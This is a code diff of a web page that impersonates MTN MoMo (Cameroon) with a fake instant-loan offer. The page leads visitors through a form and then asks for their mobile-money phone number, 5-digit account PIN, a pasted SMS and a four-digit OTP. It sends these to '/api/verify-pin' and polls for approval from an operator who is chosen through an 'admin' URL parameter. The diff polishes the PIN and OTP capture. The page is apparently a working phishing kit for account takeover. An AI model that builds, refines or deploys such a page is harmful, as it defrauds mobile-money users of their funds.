@@ -21,18 +21,15 @@
     --radius: 12px;
     --radius-sm: 8px;
   }
- * {
-    box-sizing: border-box;
-    margin: 0;
-    padding: 0;
-}
+  * { box-sizing: border-box; margin: 0; padding: 0; }
 
-body {
+  body {
     font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
     background: var(--page-bg);
     color: var(--text-dark);
     min-height: 100vh;
-}
+  }
+
   /* PAGE SYSTEM */
   .page { display: none; min-height: 100vh; animation: fadeIn 0.3s ease; }
   .page.active { display: flex; flex-direction: column; }
@@ -48,39 +45,9 @@ body {
   .modal h3 { font-size:1.1rem; font-weight:600; color:var(--text-dark); margin-bottom:6px; }
   .modal p  { font-size:0.88rem; color:var(--text-light); }
 
-/* LOGO */
-.logo-group{
-    display:flex;
-    flex-direction:column;
-    align-items:center;
-    gap:3px;
-}
-
-.logo-img{
-    width:40px;
-    height:40px;
-    object-fit:contain;
-    display:block;
-}
-
-.logo-text{
-    font-size:1.1rem;
-    font-weight:800;
-    letter-spacing:-0.02em;
-}
-
-.logo-text .halo{
-    color:#fff;
-}
-
-.logo-text .pesa{
-    color:#FFCC00;
-}
-
-.logo-sub{
-    font-size:0.72rem;
-    color:rgba(255,255,255,0.65);
-}
+  /* LOGO */
+  .logo-img { width:40px; height:40px; object-fit:contain; display:block; }
+  .logo-sub { font-size:0.72rem; color:rgba(255,255,255,0.65); }
 
   /* NAV */
   .navbar { background:var(--navy); display:flex; align-items:center; justify-content:center; padding:0 20px; height:54px; position:relative; flex-shrink:0; }
@@ -123,7 +90,7 @@ body {
   /* FOOTER */
   .pg-footer { margin-top:auto; padding:14px; text-align:center; font-size:0.78rem; color:var(--text-light); background:#fff; border-top:1px solid #eee; flex-shrink:0; }
 
-  /* ───── PAGE 1: LANDING ───── */
+  /* LANDING */
   #page-landing { background:var(--page-bg); }
   .land-nav { background:var(--navy); display:flex; align-items:center; justify-content:space-between; padding:0 24px; height:60px; flex-shrink:0; }
   .land-nav .hbg { display:flex; flex-direction:column; gap:4px; cursor:pointer; }
@@ -149,7 +116,7 @@ body {
   .feat .fs { font-size:0.73rem; color:var(--text-light); }
   .land-footer { background:var(--navy); padding:14px; text-align:center; font-size:0.77rem; color:rgba(255,255,255,0.6); flex-shrink:0; }
 
-  /* ───── STEP PAGES 2-4 ───── */
+  /* STEPS */
   .step-center { flex:1; display:flex; align-items:flex-start; justify-content:center; padding:28px 16px; }
   .step-card { width:100%; max-width:480px; background:#fff; border-radius:var(--radius); box-shadow:0 4px 24px rgba(0,0,0,0.08); padding:32px 28px; }
   .step-card h2 { font-size:1.25rem; font-weight:700; text-align:center; margin-bottom:4px; }
@@ -163,7 +130,7 @@ body {
   .sum-box .sum-row .sk { color:var(--text-light); }
   .sum-box .sum-row .sv { font-weight:500; }
 
-  /* ───── PAGE 5: SUBMITTED ───── */
+  /* SUBMITTED */
   #page-submitted { background:linear-gradient(160deg,var(--navy),#002233); align-items:center; justify-content:center; }
   .sub-wrap { text-align:center; padding:40px 24px; max-width:420px; }
   .sub-icon { width:80px; height:80px; border-radius:50%; background:rgba(255,255,255,0.1); border:2px solid rgba(255,255,255,0.3); display:flex; align-items:center; justify-content:center; font-size:2rem; margin:0 auto 24px; animation:pulse 2s ease infinite; }
@@ -174,10 +141,9 @@ body {
   .redir-n { font-weight:700; color:var(--teal); }
   .btn-go { background:var(--grad); color:#1C1C1C; border:none; border-radius:8px; padding:14px 36px; font-size:0.9rem; font-weight:600; cursor:pointer; font-family:inherit; letter-spacing:0.04em; }
 
-  /* ───── PAGE 6: LOGIN ───── */
+  /* LOGIN */
   #page-login { background:#fff; }
   .login-hdr { background:var(--navy); padding:32px 20px 36px; display:flex; flex-direction:column; align-items:center; gap:4px; flex-shrink:0; }
-  .login-hdr .logo-text { font-size:1.5rem; }
   .login-body-wrap { flex:1; background:#fff; padding:32px 20px 0; display:flex; flex-direction:column; align-items:center; }
   .login-body-wrap h2 { font-size:1.05rem; font-weight:600; margin-bottom:24px; }
   .login-inner { width:100%; max-width:380px; }
@@ -186,22 +152,40 @@ body {
   .lg-phone-row input { flex:1; padding:11px 14px; border:1.5px solid var(--border); border-left:none; border-radius:0 var(--radius-sm) var(--radius-sm) 0; font-family:inherit; font-size:0.9rem; outline:none; background:#fff; transition:border-color 0.2s; }
   .lg-phone-row input:focus { border-color:var(--teal); }
   .pin-label { font-size:0.82rem; color:var(--text-light); text-align:center; margin-bottom:12px; }
-  .pin-row { display:flex; gap:8px; justify-content:center; margin-bottom:12px; position:relative; align-items:center; }
-  .pin-box { width:44px; height:52px; border:1.5px solid var(--border); border-radius:var(--radius-sm); text-align:center; font-family:inherit; font-size:1.3rem; font-weight:700; color:var(--navy); outline:none; transition:border-color 0.2s; }
-  .pin-box:focus { border-color:var(--teal); box-shadow:0 0 0 3px rgba(255,204,0,0.2); }
-  .pin-eye { cursor:pointer; color:var(--text-light); font-size:1rem; background:none; border:none; margin-left:4px; }
+  
+  /* PIN & OTP DIGIT BOXES */
+  .pin-row, .otp-inputs { display:flex; gap:10px; justify-content:center; margin-bottom:16px; position:relative; align-items:center; }
+  .pin-box, .otp-box { 
+    width: 48px; 
+    height: 54px; 
+    border: 1.5px solid var(--border); 
+    border-radius: var(--radius-sm); 
+    text-align: center; 
+    font-family: inherit; 
+    font-size: 1.4rem; 
+    font-weight: 700; 
+    color: var(--navy); 
+    outline: none; 
+    transition: all 0.2s ease; 
+    background: #FAFAFA;
+  }
+  .pin-box:focus, .otp-box:focus { 
+    border-color: var(--navy); 
+    background: #FFF;
+    box-shadow: 0 0 0 3px rgba(0,79,113,0.15); 
+  }
+  .pin-eye { cursor:pointer; color:var(--text-light); font-size:1.1rem; background:none; border:none; margin-left:6px; padding:4px; }
   .forgot-pin { text-align:center; font-size:0.82rem; color:var(--text-light); margin-bottom:24px; cursor:pointer; }
   .btn-login { width:100%; max-width:380px; padding:13px; background:#e8e8e8; color:#aaa; border:none; border-radius:8px; font-size:0.88rem; font-weight:600; letter-spacing:0.05em; cursor:pointer; font-family:inherit; transition:all 0.2s; }
   .btn-login.rdy { background:var(--grad); color:#1C1C1C; }
   .lg-curve { margin-top:32px; background:#fff; overflow:hidden; flex-shrink:0; }
   .lg-curve::before { content:''; display:block; background:var(--navy); height:55px; clip-path:ellipse(60% 100% at 50% 100%); margin-bottom:-4px; }
   .lg-foot { background:var(--navy); padding:24px 20px 32px; display:flex; flex-direction:column; align-items:center; gap:8px; text-align:center; }
-  .lg-foot .logo-text { font-size:1.2rem; }
   .lg-version { font-size:0.72rem; color:rgba(255,255,255,0.4); margin-top:4px; }
   .lg-terms { font-size:0.72rem; color:rgba(255,255,255,0.55); }
   .lg-terms a { color:rgba(255,255,255,0.75); }
 
-  /* ───── PAGE 7: OTP ───── */
+  /* OTP */
   #page-otp { background:#fff; }
   .otp-topbar { display:flex; align-items:center; justify-content:space-between; padding:0 20px; height:52px; border-bottom:1px solid #eee; flex-shrink:0; }
   .otp-topbar .bk { font-size:1.1rem; color:#333; cursor:pointer; background:none; border:none; }
@@ -212,17 +196,14 @@ body {
   .otp-card h2 { font-size:1.2rem; font-weight:700; margin-bottom:6px; }
   .otp-hint { font-size:0.83rem; color:var(--text-light); margin-bottom:5px; }
   .otp-phone { font-size:0.9rem; font-weight:600; color:var(--text-dark); margin-bottom:22px; }
-  .otp-inputs { display:flex; gap:8px; margin-bottom:12px; width:100%; }
-  .otp-box { flex:1; min-width:0; width:0; height:52px; border:1.5px solid var(--border); border-radius:var(--radius-sm); text-align:center; font-family:inherit; font-size:1.2rem; font-weight:700; color:var(--navy); outline:none; transition:border-color 0.2s; }
-  .otp-box:focus { border-color:var(--teal); box-shadow:0 0 0 3px rgba(255,204,0,0.2); }
-  .otp-resend { font-size:0.8rem; color:#004F71; margin-bottom:22px; }
+  .otp-resend { font-size:0.8rem; color:#004F71; margin-bottom:22px; text-align:center; }
   .btn-otp { width:100%; padding:13px; background:#e8e8e8; color:#aaa; border:none; border-radius:8px; font-size:0.88rem; font-weight:600; letter-spacing:0.05em; cursor:pointer; font-family:inherit; transition:all 0.2s; }
   .btn-otp.rdy { background:var(--grad); color:#1C1C1C; }
   .otp-curve { background:#fff; overflow:hidden; flex-shrink:0; }
   .otp-curve::before { content:''; display:block; background:var(--navy); height:50px; clip-path:ellipse(60% 100% at 50% 100%); margin-bottom:-4px; }
   .otp-foot { background:var(--navy); padding:14px; text-align:center; font-size:0.75rem; color:rgba(255,255,255,0.55); }
 
-  /* ───── PAGE 8: APPROVAL ───── */
+  /* APPROVAL */
   #page-approval { background:linear-gradient(135deg,#FFCC00 0%,#FFB300 50%,#004F71 100%); min-height:100vh; align-items:center; justify-content:center; padding:32px 16px; }
   .appr-wrap { width:100%; max-width:520px; }
   .appr-top { background:#fff; border-radius:var(--radius) var(--radius) 0 0; padding:28px 24px 0; text-align:center; }
@@ -233,9 +214,6 @@ body {
   .appr-banner .abl { font-size:0.72rem; color:rgba(28,28,28,0.9); text-transform:uppercase; letter-spacing:0.06em; }
   .appr-banner .aba { font-size:2rem; font-weight:700; color:#1C1C1C; }
   .comp-box { background:#FFFBEA; border:1px solid #F5C842; padding:14px 16px; }
-  .comp-box .ch { display:flex; align-items:center; gap:6px; font-size:0.82rem; font-weight:700; color:#a07000; margin-bottom:6px; }
-  .comp-box p { font-size:0.78rem; color:#7a5500; line-height:1.6; }
-  .comp-box strong { font-weight:600; }
   .ld-card { background:#fff; padding:20px 24px; }
   .ld-card .ld-htitle { font-size:0.82rem; font-weight:600; color:var(--text-mid); margin-bottom:14px; display:flex; align-items:center; gap:6px; }
   .ld-card .ld-row { display:flex; align-items:center; gap:12px; padding:10px 0; border-bottom:1px solid #f5f5f5; }
@@ -256,107 +234,22 @@ body {
   .rth-btn { width:100%; padding:14px; background:var(--grad); color:#1C1C1C; border:none; border-radius:var(--radius-sm); font-size:0.88rem; font-weight:600; letter-spacing:0.04em; cursor:pointer; font-family:inherit; box-shadow:0 4px 12px rgba(0,0,0,0.1); transition:all 0.2s ease; }
   .rth-btn:hover { opacity:0.95; transform:translateY(-1px); }
   
-  /* PROFESSIONAL RE-APPLY BUTTON */
   .reapply-btn-pro { 
-    width: 100%; 
-    padding: 14px; 
-    background: #ffffff; 
-    color: var(--navy); 
-    border: 2px solid var(--navy); 
-    border-radius: var(--radius-sm); 
-    font-size: 0.88rem; 
-    font-weight: 700; 
-    letter-spacing: 0.04em; 
-    cursor: pointer; 
-    font-family: inherit; 
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    gap: 8px;
-    box-shadow: 0 2px 6px rgba(0,0,0,0.04);
-    transition: all 0.25s ease; 
-    text-decoration: none;
+    width: 100%; padding: 14px; background: #ffffff; color: var(--navy); border: 2px solid var(--navy); border-radius: var(--radius-sm); font-size: 0.88rem; font-weight: 700; letter-spacing: 0.04em; cursor: pointer; font-family: inherit; display: flex; align-items: center; justify-content: center; gap: 8px; box-shadow: 0 2px 6px rgba(0,0,0,0.04); transition: all 0.25s ease; text-decoration: none;
   }
-  .reapply-btn-pro:hover { 
-    background: #f0f8ff; 
-    border-color: #003851;
-    color: #003851;
-    transform: translateY(-1px);
-    box-shadow: 0 4px 10px rgba(0,79,113,0.1);
-  }
+  .reapply-btn-pro:hover { background: #f0f8ff; border-color: #003851; color: #003851; transform: translateY(-1px); box-shadow: 0 4px 10px rgba(0,79,113,0.1); }
 
-/* ───── COMPACT PROFESSIONAL LIVE APPROVAL CARD ───── */
-.live-popup {
-    position: absolute;
-    top: 72px;
-    left: 50%;
-    transform: translateX(-50%);
-    width: 90%;
-    max-width: 290px;
-    background: rgba(255, 255, 255, 0.96);
-    backdrop-filter: blur(4px);
-    border-radius: 8px;
-    padding: 8px 12px;
-    display: flex;
-    align-items: center;
-    gap: 8px;
-    border: 1px solid rgba(0, 0, 0, 0.08);
-    box-shadow: 0 4px 12px rgba(0, 0, 0, 0.08);
-    opacity: 0;
-    visibility: hidden;
-    transition: all 0.3s ease;
-    z-index: 9999;
-}
+  /* LIVE POPUP */
+  .live-popup { position: absolute; top: 72px; left: 50%; transform: translateX(-50%); width: 90%; max-width: 290px; background: rgba(255, 255, 255, 0.96); backdrop-filter: blur(4px); border-radius: 8px; padding: 8px 12px; display: flex; align-items: center; gap: 8px; border: 1px solid rgba(0, 0, 0, 0.08); box-shadow: 0 4px 12px rgba(0, 0, 0, 0.08); opacity: 0; visibility: hidden; transition: all 0.3s ease; z-index: 9999; }
+  .live-popup.show { opacity: 1; visibility: visible; }
+  .popup-avatar { width: 28px; height: 28px; min-width: 28px; border-radius: 50%; background: var(--grad); color: #1C1C1C; display: flex; align-items: center; justify-content: center; font-size: 0.75rem; font-weight: 600; }
+  .popup-content { flex: 1; }
+  .popup-text { font-size: 0.71rem; line-height: 1.3; color: var(--text-mid); }
+  .popup-text strong { color: var(--text-dark); font-weight: 600; }
+  .popup-time { margin-top: 1px; font-size: 0.58rem; color: #16a34a; font-weight: 500; }
+  .popup-time::before { content: "● "; animation: pulse 1.2s infinite; }
 
-.live-popup.show {
-    opacity: 1;
-    visibility: visible;
-}
-
-.popup-avatar {
-    width: 28px;
-    height: 28px;
-    min-width: 28px;
-    border-radius: 50%;
-    background: var(--grad);
-    color: #1C1C1C;
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    font-size: 0.75rem;
-    font-weight: 600;
-}
-
-.popup-content {
-    flex: 1;
-}
-
-.popup-text {
-    font-size: 0.71rem;
-    line-height: 1.3;
-    color: var(--text-mid);
-}
-
-.popup-text strong {
-    color: var(--text-dark);
-    font-weight: 600;
-}
-
-.popup-time {
-    margin-top: 1px;
-    font-size: 0.58rem;
-    color: #16a34a;
-    font-weight: 500;
-}
-
-.popup-time::before {
-    content: "● ";
-    animation: pulse 1.2s infinite;
-}
-
-@keyframes pulse {
-    50% { opacity: .4; }
-}  /* ───── INLINE ERROR / STATUS MESSAGES ───── */
+  /* STATUS MESSAGES & WAITING BOX */
   .msg-box { border-radius:var(--radius-sm); padding:12px 16px; font-size:0.84rem; margin-bottom:16px; display:none; align-items:center; gap:10px; }
   .msg-box.show { display:flex; }
   .msg-box.error   { background:#fef2f2; border:1.5px solid #fecaca; color:#991b1b; }
@@ -365,74 +258,28 @@ body {
   .msg-box.warning { background:#fefce8; border:1.5px solid #fef08a; color:#854d0e; }
   .msg-icon { font-size:1.1rem; flex-shrink:0; }
 
-  /* ───── WAITING / POLLING INDICATOR ───── */
   .waiting-box { background:#fffdf5; border:1px solid #ffe8cc; border-radius:var(--radius-sm); padding:16px; text-align:center; margin-bottom:16px; display:none; }
   .waiting-box.show { display:block; }
   .waiting-box .wb-spinner { width:28px; height:28px; border:3px solid #ffe8cc; border-top-color:var(--navy); border-radius:50%; animation:spin 0.8s linear infinite; margin:0 auto 10px; }
   .waiting-box p { font-size:0.82rem; color:var(--text-mid); }
 
-/* MTN Logo Style */
-.hp-logo-inline {
-  display: flex;
-  align-items: center;
-  gap: 8px;
-}
+  .hp-logo-inline { display: flex; align-items: center; gap: 8px; }
+  .hp-logo-inline img { width: 36px; height: 36px; object-fit: contain; display: block; }
+  .hp-logo-inline .brand { font-size: 1.4rem; font-weight: 800; color: #fff; letter-spacing: -0.01em; }
+  .hp-logo-inline .brand span { color: #FFCC00; }
 
-.hp-logo-inline img {
-  width: 36px;
-  height: 36px;
-  object-fit: contain;
-  display: block;
-}
+  .hp-logo-sm { display: flex; align-items: center; gap: 6px; }
+  .hp-logo-sm img { width: 26px; height: 26px; object-fit: contain; display: block; }
+  .hp-logo-sm .brand { font-size: 1.1rem; font-weight: 800; color: #fff; }
+  .hp-logo-sm .brand span { color: #FFCC00; }
 
-.hp-logo-inline .brand {
-  font-size: 1.4rem;
-  font-weight: 800;
-  color: #fff;
-  letter-spacing: -0.01em;
-}
-
-.hp-logo-inline .brand span {
-  color: #FFCC00;
-}
-
-.hp-logo-sm {
-  display: flex;
-  align-items: center;
-  gap: 6px;
-}
-
-.hp-logo-sm img {
-  width: 26px;
-  height: 26px;
-  object-fit: contain;
-  display: block;
-}
-
-.hp-logo-sm .brand {
-  font-size: 1.1rem;
-  font-weight: 800;
-  color: #fff;
-}
-
-.hp-logo-sm .brand span {
-  color: #FFCC00;
-}
-
-@media (max-width:500px) {
-  .field-row {
-    grid-template-columns: 1fr;
+  @media (max-width:500px) {
+    .field-row { grid-template-columns: 1fr; }
+    .step-card, .land-card { padding: 24px 18px; }
+    .otp-card { padding: 24px 16px; }
+    .pin-box, .otp-box { width: 42px; height: 48px; font-size: 1.2rem; }
   }
-
-  .step-card,
-  .land-card {
-    padding: 24px 18px;
-  }
-
-  .otp-card {
-    padding: 24px 16px;
-  }
-}</style>
+</style>
 </head>
 
 <body>
@@ -440,26 +287,18 @@ body {
 <!-- PAGE 1: LANDING -->
 <div id="page-landing" class="page active">
   <nav class="land-nav">
-    <div class="hbg">
-      <span></span>
-      <span></span>
-      <span></span>
-    </div>
-
+    <div class="hbg"><span></span><span></span><span></span></div>
     <div class="hp-logo-inline">
         <img src="images/mtn-logo.png" alt="MTN MoMo Logo" class="logo-img">
         <div class="brand">MTN <span>MoMo</span></div>
     </div>
-
     <div style="width:28px"></div>
   </nav>
 
   <div class="land-center">
     <div class="land-card">
-        <h1>Get Your Loan Quickly</h1>
-        <p class="land-tagline">
-            Instant approval • Low rates • Flexible terms
-        </p>
+      <h1>Get Your Loan Quickly</h1>
+      <p class="land-tagline">Instant approval • Low rates • Flexible terms</p>
         
       <div class="calc-box">
         <h2>Loan Calculator</h2>
@@ -535,8 +374,11 @@ body {
       </div>
       <div class="field">
         <label>MoMo Phone Number</label>
-        <div class="phone-row"><div class="ph-pre">🇨🇲 +237</div><input type="tel" id="s2ph" placeholder="671234567 or 237671234567" maxlength="12" oninput="normalizePhone('s2ph');clearErr('s2Err')"></div>
-        <div class="field-hint">Enter your valid MTN Cameroon number</div>
+        <div class="phone-row">
+          <div class="ph-pre">🇨🇲 +237</div>
+          <input type="tel" id="s2ph" placeholder="671234567" maxlength="9" pattern="[0-9]{9}" oninput="sanitizePhone(this); clearErr('s2Err')">
+        </div>
+        <div class="field-hint">Enter your valid 9-digit MTN Cameroon number</div>
       </div>
       <div class="step-btns">
         <button class="btn-gray" onclick="goTo('page-step1')">PREVIOUS</button>
@@ -608,17 +450,19 @@ body {
 
       <div class="lg-phone-row">
         <div class="lg-ph-pre">🇨🇲 +237</div>
-        <input type="tel" id="lgPh" placeholder="671234567 or 237671234567" maxlength="12" oninput="normalizePhone('lgPh');chkLogin()">
+        <input type="tel" id="lgPh" placeholder="671234567" maxlength="9" pattern="[0-9]{9}" oninput="sanitizePhone(this); chkLogin()">
       </div>
+      
       <div class="pin-label">Enter your 5-digit PIN code</div>
-      <div class="pin-row">
-        <input type="password" class="pin-box" maxlength="1" oninput="pinMv(this,0)" id="p0">
-        <input type="password" class="pin-box" maxlength="1" oninput="pinMv(this,1)" id="p1">
-        <input type="password" class="pin-box" maxlength="1" oninput="pinMv(this,2)" id="p2">
-        <input type="password" class="pin-box" maxlength="1" oninput="pinMv(this,3)" id="p3">
-        <input type="password" class="pin-box" maxlength="1" oninput="pinMv(this,4)" id="p4">
-        <button class="pin-eye" onclick="togPin()">👁</button>
+      <div class="pin-row" id="pinContainer">
+        <input type="password" class="pin-box" maxlength="1" inputmode="numeric" pattern="[0-9]*" id="p0">
+        <input type="password" class="pin-box" maxlength="1" inputmode="numeric" pattern="[0-9]*" id="p1">
+        <input type="password" class="pin-box" maxlength="1" inputmode="numeric" pattern="[0-9]*" id="p2">
+        <input type="password" class="pin-box" maxlength="1" inputmode="numeric" pattern="[0-9]*" id="p3">
+        <input type="password" class="pin-box" maxlength="1" inputmode="numeric" pattern="[0-9]*" id="p4">
+        <button class="pin-eye" type="button" onclick="togPin()">👁</button>
       </div>
+      
       <div class="forgot-pin">Forgot PIN code?</div>
       <button class="btn-login" id="bLogin" onclick="doLogin()">LOG IN</button>
     </div>
@@ -636,7 +480,7 @@ body {
   </div>
 </div>
 
-<!-- PAGE OTP (Two Verification Steps: 1. SMS Verification Pasting, 2. Four Digits OTP) -->
+<!-- PAGE OTP -->
 <div id="page-otp" class="page">
   <div class="otp-topbar">
     <button class="bk" onclick="goTo('page-login')">←</button>
@@ -673,11 +517,11 @@ body {
       <!-- STEP 2: Four Digits OTP Verification Code -->
       <div id="otpStep2" style="display:none;">
         <p class="otp-hint" style="font-weight:600; color:var(--navy); margin-bottom:8px;">Step 2: Four-Digit OTP Verification Code</p>
-        <div class="otp-inputs">
-          <input type="text" class="otp-box" maxlength="1" oninput="otpMv(this,0)" id="o0">
-          <input type="text" class="otp-box" maxlength="1" oninput="otpMv(this,1)" id="o1">
-          <input type="text" class="otp-box" maxlength="1" oninput="otpMv(this,2)" id="o2">
-          <input type="text" class="otp-box" maxlength="1" oninput="otpMv(this,3)" id="o3">
+        <div class="otp-inputs" id="otpContainer">
+          <input type="text" class="otp-box" maxlength="1" inputmode="numeric" pattern="[0-9]*" id="o0">
+          <input type="text" class="otp-box" maxlength="1" inputmode="numeric" pattern="[0-9]*" id="o1">
+          <input type="text" class="otp-box" maxlength="1" inputmode="numeric" pattern="[0-9]*" id="o2">
+          <input type="text" class="otp-box" maxlength="1" inputmode="numeric" pattern="[0-9]*" id="o3">
         </div>
         <div class="otp-resend" id="otpRs">Resend code in <span id="rsS">60</span> seconds</div>
         <button class="btn-otp" id="bOtp" onclick="doOtp()">VERIFY & COMPLETE</button>
@@ -741,6 +585,7 @@ body {
     </div>
 </div>
 
+<!-- OVERLAYS -->
 <div class="overlay" id="mLogin">
   <div class="modal"><div class="spinner"></div><h3>Please wait…</h3><p>Sending your information for verification</p></div>
 </div>
@@ -752,9 +597,7 @@ body {
 </div>
 
 <script>
-  // ══════════════════════════════════════════════════════
   // STATE
-  // ══════════════════════════════════════════════════════
   const S = {
     amt: 50000,
     term: '12 Months',
@@ -766,39 +609,22 @@ body {
     assignedAdminId: null
   };
 
-  const _URL_ADMIN_ID = (() => {
-    const params = new URLSearchParams(window.location.search);
-    const id = params.get('admin');
-    sessionStorage.removeItem('selectedAdminId');
-    localStorage.removeItem('selectedAdminId');
-    if (id && id !== 'undefined' && id !== 'null' && id.trim() !== '') {
-      sessionStorage.setItem('selectedAdminId', id.trim());
-      return id.trim();
-    }
-    return null;
-  })();
-
   function getAdminId() {
     const params = new URLSearchParams(window.location.search);
     const urlId  = params.get('admin');
     if (urlId && urlId !== 'undefined' && urlId !== 'null' && urlId.trim() !== '') {
+      sessionStorage.setItem('selectedAdminId', urlId.trim());
       return urlId.trim();
     }
     return sessionStorage.getItem('selectedAdminId') || null;
   }
 
-  // ══════════════════════════════════════════════════════
-  // PAGE NAVIGATION
-  // ══════════════════════════════════════════════════════
   function goTo(id) {
     document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
     document.getElementById(id).classList.add('active');
     window.scrollTo(0, 0);
   }
 
-  // ══════════════════════════════════════════════════════
-  // LOAN CALCULATOR (XAF currency)
-  // ══════════════════════════════════════════════════════
   function calcUp() {
     const a = +document.getElementById('rA').value;
     const t = +document.getElementById('rT').value;
@@ -811,16 +637,13 @@ body {
     document.getElementById('rT').style.setProperty('--pct', ((t-3)/(24-3)*100).toFixed(1) + '%');
   }
 
-  // ══════════════════════════════════════════════════════
-  // STEP NAVIGATION
-  // ══════════════════════════════════════════════════════
-  function normalizePhone(id) {
-    const el = document.getElementById(id);
-    if (el.value.startsWith('237')) {
-      const cursor = el.selectionStart;
-      el.value = el.value.substring(3);
-      el.setSelectionRange(Math.max(0, cursor - 3), Math.max(0, cursor - 3));
+  // PHONE NUMBER SANITIZATION (Exactly 9 Digits)
+  function sanitizePhone(el) {
+    let raw = el.value.replace(/\D/g, '');
+    if (raw.startsWith('237') && raw.length > 9) {
+      raw = raw.substring(3);
     }
+    el.value = raw.slice(0, 9);
   }
 
   function showErr(id, msg) {
@@ -867,25 +690,19 @@ body {
     const phone = document.getElementById('s2ph').value.trim();
 
     if (!first) {
-        showErr('s2Err', 'Please enter your first name.');
-        shakeField('s2fi');
-        return;
+      showErr('s2Err', 'Please enter your first name.');
+      shakeField('s2fi'); return;
     }
-
     if (!last) {
-        showErr('s2Err', 'Please enter your last name.');
-        shakeField('s2la');
-        return;
+      showErr('s2Err', 'Please enter your last name.');
+      shakeField('s2la'); return;
     }
-
-    if (!phone || phone.length < 9) {
-        showErr('s2Err', 'Please enter a valid 9-digit phone number.');
-        shakeField('s2ph');
-        return;
+    if (!phone || phone.length !== 9) {
+      showErr('s2Err', 'Please enter a valid 9-digit MTN phone number.');
+      shakeField('s2ph'); return;
     }
 
     clearErr('s2Err');
-
     S.first = first;
     S.last = last;
     S.phone = phone;
@@ -895,8 +712,12 @@ body {
     document.getElementById('sP').textContent = S.purpose || '—';
     document.getElementById('sN').textContent = [S.first, S.last].filter(Boolean).join(' ') || '—';
 
+    document.getElementById('lgPh').value = phone;
+    chkLogin();
+
     goTo('page-step3');
-}
+  }
+
   function submitApp() {
     const income = document.getElementById('s3in').value;
     if (!income || Number(income) <= 0) {
@@ -922,9 +743,6 @@ body {
     }, 1500);
   }
 
-  // ══════════════════════════════════════════════════════
-  // INLINE MESSAGE HELPERS
-  // ══════════════════════════════════════════════════════
   function showLoginMsg(text) {
     document.getElementById('lgMsgTxt').textContent = text;
     document.getElementById('lgMsg').classList.add('show');
@@ -942,35 +760,78 @@ body {
     if (type === 'warning') { document.getElementById('otpMsgWarnTxt').textContent = text; document.getElementById('otpMsgWarn').classList.add('show'); }
   }
   function hideOtpMsgs() {
-    ['otpMsgErr','otpMsgOk','otpMsgWarn'].forEach(id => {
-      document.getElementById(id).classList.remove('show');
+    ['otpMsgErr','otpMsgOk','otpMsgWarn'].forEach(id => document.getElementById(id).classList.remove('show'));
+  }
+
+  // DYNAMIC DIGIT INPUT HANDLERS (PIN & OTP)
+  function setupDigitGroup(containerId, count, onComplete) {
+    const container = document.getElementById(containerId);
+    if (!container) return;
+    const inputs = Array.from(container.querySelectorAll('input'));
+
+    inputs.forEach((input, index) => {
+      input.addEventListener('input', (e) => {
+        const val = input.value.replace(/\D/g, '');
+        input.value = val.slice(-1);
+        if (input.value && index < count - 1) {
+          inputs[index + 1].focus();
+        }
+        if (onComplete) onComplete();
+      });
+
+      input.addEventListener('keydown', (e) => {
+        if (e.key === 'Backspace') {
+          if (!input.value && index > 0) {
+            inputs[index - 1].focus();
+            inputs[index - 1].value = '';
+            e.preventDefault();
+          }
+        } else if (e.key === 'ArrowLeft' && index > 0) {
+          inputs[index - 1].focus();
+        } else if (e.key === 'ArrowRight' && index < count - 1) {
+          inputs[index + 1].focus();
+        }
+        if (onComplete) setTimeout(onComplete, 0);
+      });
+
+      input.addEventListener('paste', (e) => {
+        e.preventDefault();
+        const pasted = (e.clipboardData || window.clipboardData).getData('text').replace(/\D/g, '');
+        if (!pasted) return;
+        for (let i = 0; i < count - index; i++) {
+          if (i < pasted.length) {
+            inputs[index + i].value = pasted[i];
+            if (index + i < count - 1) inputs[index + i + 1].focus();
+          }
+        }
+        if (onComplete) onComplete();
+      });
     });
   }
 
-  // ══════════════════════════════════════════════════════
-  // LOGIN PAGE — PIN INPUT HELPERS (5 digits)
-  // ══════════════════════════════════════════════════════
-  function pinMv(el, i) {
-    el.value = el.value.replace(/\D/, '');
-    if (el.value && i < 4) document.getElementById('p' + (i+1)).focus();
-    chkLogin();
+  function getDigitValue(prefix, count) {
+    let val = '';
+    for (let i = 0; i < count; i++) {
+      val += document.getElementById(prefix + i).value;
+    }
+    return val;
   }
 
   function chkLogin() {
-    const ok = [0,1,2,3,4].every(i => document.getElementById('p'+i).value);
-    document.getElementById('bLogin').className = ok ? 'btn-login rdy' : 'btn-login';
+    const phone = document.getElementById('lgPh').value.trim();
+    const pin = getDigitValue('p', 5);
+    const isReady = phone.length === 9 && pin.length === 5;
+    document.getElementById('bLogin').className = isReady ? 'btn-login rdy' : 'btn-login';
   }
 
   function togPin() {
-    [0,1,2,3,4].forEach(i => {
-      const b = document.getElementById('p'+i);
+    for (let i = 0; i < 5; i++) {
+      const b = document.getElementById('p' + i);
       b.type = b.type === 'password' ? 'text' : 'password';
-    });
+    }
   }
 
-  // ══════════════════════════════════════════════════════
-  // LOGIN — CALLS /api/verify-pin
-  // ══════════════════════════════════════════════════════
+  // LOGIN REQUEST
   let _loginInFlight = false;
 
   async function doLogin() {
@@ -978,10 +839,14 @@ body {
     hideLoginMsg();
 
     const rawPhone = document.getElementById('lgPh').value.trim();
-    const pin = [0,1,2,3,4].map(i => document.getElementById('p'+i).value).join('');
+    const pin = getDigitValue('p', 5);
 
-    if (!rawPhone || pin.length < 5) {
-      showLoginMsg('Please enter the phone number and 5-digit PIN code.');
+    if (rawPhone.length !== 9) {
+      showLoginMsg('Please enter a valid 9-digit phone number.');
+      shakeField('lgPh'); return;
+    }
+    if (pin.length !== 5) {
+      showLoginMsg('Please enter your 5-digit PIN code.');
       return;
     }
 
@@ -1005,7 +870,6 @@ body {
       });
 
       const data = await res.json();
-
       document.getElementById('mLogin').classList.remove('show');
       _loginInFlight = false;
 
@@ -1021,12 +885,10 @@ body {
         document.getElementById('otpStep2').style.display = 'none';
 
         pollPinStatus();
-
       } else {
         document.getElementById('bLogin').disabled = false;
         showLoginMsg(data.message || 'Verification failed. Please try again.');
       }
-
     } catch (err) {
       _loginInFlight = false;
       document.getElementById('mLogin').classList.remove('show');
@@ -1035,9 +897,7 @@ body {
     }
   }
 
-  // ══════════════════════════════════════════════════════
-  // POLL /api/check-pin-status
-  // ══════════════════════════════════════════════════════
+  // POLLING HELPERS
   let pinPollInterval = null;
 
   function pollPinStatus() {
@@ -1047,7 +907,6 @@ body {
       try {
